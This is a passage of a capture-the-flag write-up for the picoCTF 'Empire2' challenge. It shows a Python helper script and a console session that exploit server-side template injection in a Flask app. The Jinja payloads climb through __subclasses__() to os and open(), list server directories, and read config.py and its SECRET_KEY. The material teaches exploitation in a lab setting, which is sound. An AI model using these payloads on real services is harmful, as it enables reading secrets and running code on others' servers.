        print "Logged in"
    def do_exit(self, inp):
        return True
    def do_send(self, param):
        # Literal curly brackets are escaped by another set of curly brackets
        q = "{{{{{}}}}}".format(param) 
        print "Sending: '{}'".format(q)
        self.site.add_item(q)
        print self.site.get_last_item()
MyPrompt().cmdloop()
```
Since direct access to the Python built-ins is blocked, we'll build our way up using the same technique that worked in last year's [Flaskcards](/2018_picoCTF/Flaskcards.md).
Session:
```console
root@kali:/media/sf_CTFs/pico/Empire2# python shell.py
Logged in
(Cmd) send 4*4
Sending: '{{4*4}}'
16
(Cmd) send ''.__class__
Sending: '{{''.__class__}}'
(Cmd) send ''.__class__.mro()
Sending: '{{''.__class__.mro()}}'
[, ]
(Cmd) send ''.__class__.mro()[1]
Sending: '{{''.__class__.mro()[1]}}'
(Cmd) send ''.__class__.mro()[1].__subclasses__()
Sending: '{{''.__class__.mro()[1].__subclasses__()}}'

(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('.')
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('.')}}'
['server.py', 'app', 'xinet_startup.sh']
(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open']('server.py').read()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open']('server.py').read()}}'
from app import app
if __name__ == '__main__':
    app.run()
(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('app')
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').listdir('app')}}'
['templates', 'helpers.py', '__init__.py', 'config.py', 'models.py', 'routes.py']
(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'config.py')).read()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', 'config.py')).read()}}'
import os
basedir = os.path.abspath(os.path.dirname(__file__))
class Config(object):
    SECRET_KEY = 'picoCTF{your_flag_is_in_another_castle12345678}'
    SQLALCHEMY_DATABASE_URI = 'sqlite://'
    #SQLALCHEMY_DATABASE_URI = os.environ.get('DATABSE_URL') or 'sqlite:///'+os.path.join(basedir,'app.db')
    SQLALCHEMY_TRACK_MODIFICATIONS = False
(Cmd) send ''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read()
Sending: '{{''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__['open'](''.__class__.mro()[1].__subclasses__()[157]()._module.__builtins__.__import__('os').path.join('app', '__init__.py')).read()}}'
from flask import Flask
from app.config import Config
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager
from flask_bootstrap import Bootstrap
import time,atexit
from apscheduler.schedulers.background import BackgroundScheduler